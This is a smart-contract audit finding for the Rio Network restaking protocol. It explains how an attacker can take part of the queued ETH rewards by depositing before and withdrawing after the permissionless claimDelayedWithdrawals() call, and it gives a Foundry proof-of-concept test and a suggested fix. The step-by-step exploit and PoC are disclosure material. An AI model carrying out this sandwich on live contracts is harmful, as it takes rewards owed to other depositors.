Rural Tweed Lemur

medium

# A part of ETH rewards can be stolen by sandwiching `claimDelayedWithdrawals()`

## Summary
Rewards can be stolen by sandwiching the call to [EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/DelayedWithdrawalRouter.sol#L99).

## Vulnerability Detail
The protocol handles ETH rewards by sending them to the [rewards distributor](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTRewardDistributor.sol). There are at least 3 flows that end-up sending funds there:
1. When the function [RioLRTOperatorDelegator::scrapeNonBeaconChainETHFromEigenPod()](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTOperatorDelegator.sol#L150) is called to scrape non beacon chain ETH from an Eigenpod.
2. When a validator receives rewards via partial withdrawals after the function [EigenPod::verifyAndProcessWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/EigenPod.sol#L232) is called.
3. When a validator exists and has more than 32ETH the excess will be sent as rewards after the function [EigenPod::verifyAndProcessWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/EigenPod.sol#L232) is called.

All of these 3 flows end up queuing a withdrawal to the [rewards distributor](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTRewardDistributor.sol). After a delay the rewards can claimed by calling the permissionless function [EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/DelayedWithdrawalRouter.sol#L99), this call will instantly increase the TVL of the protocol.

An attacker can take advantage of this to steal a part of the rewards:
1. Mint a sensible amount of `LRTTokens` by depositing an accepted asset
2. Call [EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/DelayedWithdrawalRouter.sol#L99), after which the value of the `LRTTokens` just minted will immediately increase.
3. Request a withdrawal for all the `LRTTokens` via [RioLRTCoordinator::requestWithdrawal()](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTCoordinator.sol#L99).

### POC
Change [RioLRTRewardsDistributor::receive()](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTOperatorDelegator.sol#L244-L246) (to side-step a gas limit bug:
```solidity
receive() external payable {
    (bool success,) = address(rewardDistributor()).call{value: msg.value}('');
    require(success);
}
```

Add the following imports to `RioLRTOperatorDelegator`:
```solidity
import {IRioLRTWithdrawalQueue} from 'contracts/interfaces/IRioLRTWithdrawalQueue.sol';
import {IRioLRTOperatorRegistry} from 'contracts/interfaces/IRioLRTOperatorRegistry.sol';
import {CredentialsProofs, BeaconWithdrawal} from 'test/utils/beacon-chain/MockBeaconChain.sol';
```
To copy-paste in `RioLRTOperatorDelegator.t.sol`:

```solidity
function test_stealRewards() public {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint256 aliceInitialBalance = 40e18;
    uint256 bobInitialBalance = 40e18;
    deal(alice, aliceInitialBalance);
    deal(bob, bobInitialBalance);
    vm.prank(alice);
    reETH.token.approve(address(reETH.coordinator), type(uint256).max);
    vm.prank(bob);
    reETH.token.approve(address(reETH.coordinator), type(uint256).max);

    //->Operator delegator and validators are added to the protocol
    uint8 operatorId = addOperatorDelegator(reETH.operatorRegistry, address(reETH.rewardDistributor));
    RioLRTOperatorDelegator operatorDelegator =
        RioLRTOperatorDelegator(payable(reETH.operatorRegistry.getOperatorDetails(operatorId).delegator));

    //-> Alice deposits ETH in the protocol
    vm.prank(alice);
    reETH.coordinator.depositETH{value: aliceInitialBalance}();
    
    //-> Rebalance is called and the ETH deposited in a validator
    vm.prank(EOA, EOA);
    reETH.coordinator.rebalance(ETH_ADDRESS);

    //-> Create a new validator with a 40ETH balance and verify his credentials.
    //-> This is to "simulate" rewards accumulation
    uint40[] memory validatorIndices = new uint40[](1);
    IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorId);
    bytes32 withdrawalCredentials = operatorDelegator.withdrawalCredentials();
    beaconChain.setNextTimestamp(block.timestamp);
    CredentialsProofs memory proofs;
    (validatorIndices[0], proofs) = beaconChain.newValidator({
        balanceWei: 40 ether,
        withdrawalCreds: abi.encodePacked(withdrawalCredentials)
    });
    
    //-> Verify withdrawal crendetials
    vm.prank(details.manager);
    reETH.operatorRegistry.verifyWithdrawalCredentials(
        operatorId,
        proofs.oracleTimestamp,
        proofs.stateRootProof,
        proofs.validatorIndices,
        proofs.validatorFieldsProofs,
        proofs.validatorFields
    );

    //-> A full withdrawal for the validator is processed, 8ETH (40ETH - 32ETH) will be queued as rewards
    verifyAndProcessWithdrawalsForValidatorIndexes(address(operatorDelegator), validatorIndices);

    //-> Bob, an attacker, does the following:
    //      1. Deposits 40ETH and receives ~40e18 LRTTokens
    //      2. Cliam the withdrawal for the validator, which will instantly increase the TVL by ~7.2ETH
    //      3. Requests a withdrawal with all of the LRTTokens 
    {
        //1. Deposits 40ETH and receives ~40e18 LRTTokens
        vm.startPrank(bob);
        reETH.coordinator.depositETH{value: bobInitialBalance}();

        //2. Cliam the withdrawal for the validator, which will instantly increase the TVL by ~7.2ETH
        uint256 TVLBefore = reETH.assetRegistry.getTVL();
        delayedWithdrawalRouter.claimDelayedWithdrawals(address(operatorDelegator), 1); 
        uint256 TVLAfter = reETH.assetRegistry.getTVL();

        //->TVL increased by 7.2ETH
        assertEq(TVLAfter - TVLBefore, 7.2e18);

        //3. Requests a withdrawal with all of the LRTTokens 
        reETH.coordinator.requestWithdrawal(ETH_ADDRESS, reETH.token.balanceOf(bob));
        vm.stopPrank();
    }
    
    //-> Wait and rebalance
    skip(reETH.coordinator.rebalanceDelay());
    vm.prank(EOA, EOA);
    reETH.coordinator.rebalance(ETH_ADDRESS);

    //-> Bob withdraws the funds he requested
    vm.prank(bob);
    reETH.withdrawalQueue.claimWithdrawalsForEpoch(IRioLRTWithdrawalQueue.ClaimRequest({asset: ETH_ADDRESS, epoch: 0}));

    //-> Bob has stole ~50% of the rewards and has 3.59ETH more than he initially started with
    assertGt(bob.balance, bobInitialBalance);
    assertEq(bob.balance - bobInitialBalance, 3599550056000000000);
}
```

## Impact
Rewards can be stolen by sandwiching the call to [EigenLayer::DelayedWithdrawalRouter::claimDelayedWithdrawals()](https://github.com/Layr-Labs/eigenlayer-contracts/blob/v0.2.1-goerli-m2/src/contracts/pods/DelayedWithdrawalRouter.sol#L99), however this requires a bigger investment in funds the higher the protocol TVL.

## Code Snippet

## Tool used

Manual Review

## Recommendation
When requesting withdrawals via [RioLRTCoordinator::requestWithdrawal()](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/main/rio-sherlock-audit/contracts/restaking/RioLRTCoordinator.sol#L99) don't distribute the rewards received in the current epoch.